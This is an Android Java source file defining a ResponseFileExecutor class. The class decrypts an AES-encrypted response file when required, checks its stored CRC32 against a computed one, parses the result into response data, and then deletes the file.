package com.vvt.phoenix.prot;

import java.io.File;
import java.io.FileInputStream;

import javax.crypto.SecretKey;

import android.os.ConditionVariable;
import android.util.Log;

import com.vvt.phoenix.prot.command.response.ResponseData;
import com.vvt.phoenix.prot.parser.ResponseParser;
import com.vvt.phoenix.util.DataBuffer;
import com.vvt.phoenix.util.crc.CRC32Checksum;
import com.vvt.phoenix.util.crc.CRC32Listener;
import com.vvt.phoenix.util.crypto.AESCipher;
import com.vvt.phoenix.util.crypto.AESDecryptListener;

public class ResponseFileExecutor implements AESDecryptListener, CRC32Listener{
	
	//Debugging
	private static final String TAG = "ResponseFileExecutor";
	private static final boolean DEBUG = true;
	
	//Members
	private boolean mIsEncrypt;
	private String mResponsePath;
	private String mDecryptPath;
	private SecretKey mAesKey;
	private ConditionVariable mLock;
	private boolean mIsDecryptError;
	private Exception mDecryptException;
	private boolean mIsCrcError;
	private long mCalculatedCrc;
	private Exception mCrcException;
	
	public ResponseFileExecutor(boolean isEncrypt, String path, SecretKey aesKey){
		mIsEncrypt = isEncrypt;
		mResponsePath = path;
		mAesKey = aesKey;
		mLock = new ConditionVariable();
	}

	public ResponseData execute() throws Exception{
		ResponseData response = null;
		
		//1 check decryption
		if(mIsEncrypt){
			if(DEBUG){
				Log.v(TAG, "IS_ENCRYPT = TRUE");
			}
			
			AESCipher cipher = new AESCipher();
			mDecryptPath = mResponsePath+".decrypt";
			cipher.decryptASynchronous(mAesKey, mResponsePath, mDecryptPath, this);
			mLock.block();
			mLock.close();
			if(mIsDecryptError){
				if(DEBUG){
					Log.e(TAG, "Decryption Error");
				}
				throw mDecryptException;
			}
		}
		
		//2 validate crc
		if(DEBUG){
			Log.v(TAG, "validate CRC32");
		}
		File f = new File(mResponsePath);
		FileInputStream fIn = new FileInputStream(f);
		//2.1 get crc stored in file
		byte[] buf = new byte[4];
		fIn.read(buf);
		fIn.close();
		DataBuffer crcBuffer = new DataBuffer(buf);	//read crc32
		long storedCrc = crcBuffer.read4BytesAsLong();
		if(DEBUG){
			Log.v(TAG, "storedCrc: "+storedCrc);
		}
		//2.3 calculate crc of response data
		CRC32Checksum crc = new CRC32Checksum();
		crc.calculateASynchronous(mResponsePath, 4, (int) (f.length()-4), this);	//skip for crc 4 bytes
		mLock.block();
		mLock.close();
		if(mIsCrcError){
			if(DEBUG){
				Log.e(TAG, "CRC32 Error");
			}
			throw mCrcException;
		}
		//2.3 compare crc
		if(mCalculatedCrc != storedCrc){
			throw new Exception("CRC does not valid !");
		}
		
		//3 parse ResponseData
		if(DEBUG){
			Log.v(TAG, "Parsing Response");
		}
		response = ResponseParser.parseResponse(mResponsePath);
		
		//4 delete response file
		if(DEBUG){
			Log.v(TAG, "Delete response file");
		}
		f.delete();
		
		return response;
	}
	

	@Override
	public void onAESDecryptError(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onAESDecryptError");
		}
		new File(mResponsePath).delete();
		new File(mDecryptPath).delete();
		mIsDecryptError = true;
		mDecryptException = err;
		mLock.open();
		
	}

	@Override
	public void onAESDecryptSuccess(String resultPath) {
		if(DEBUG){
			Log.v(TAG, "onAESDecryptSuccess()");
		}
		
		//remove previous payload
		//and rename new encrypted file to original payload name
		File f = new File(mResponsePath);
		f.delete();
		f = new File(resultPath);
		File dest = new File(mResponsePath);
		f.renameTo(dest);
		
		mIsDecryptError = false;
		mLock.open();
		
	}
	
	@Override
	public void onCalculateCRC32Error(Exception err) {
		if(DEBUG){
			Log.e(TAG, "onCalculateCRC32Error");
		}
		new File(mResponsePath).delete();
		mIsCrcError = true;
		mCrcException = err;
		mLock.open();		
	}

	@Override
	public void onCalculateCRC32Success(long result) {
		if(DEBUG){
			Log.v(TAG, "onCalculateCRC32Success");
		}
		mIsCrcError = false;
		mCalculatedCrc = result;
		mLock.open();		
	}

	
}
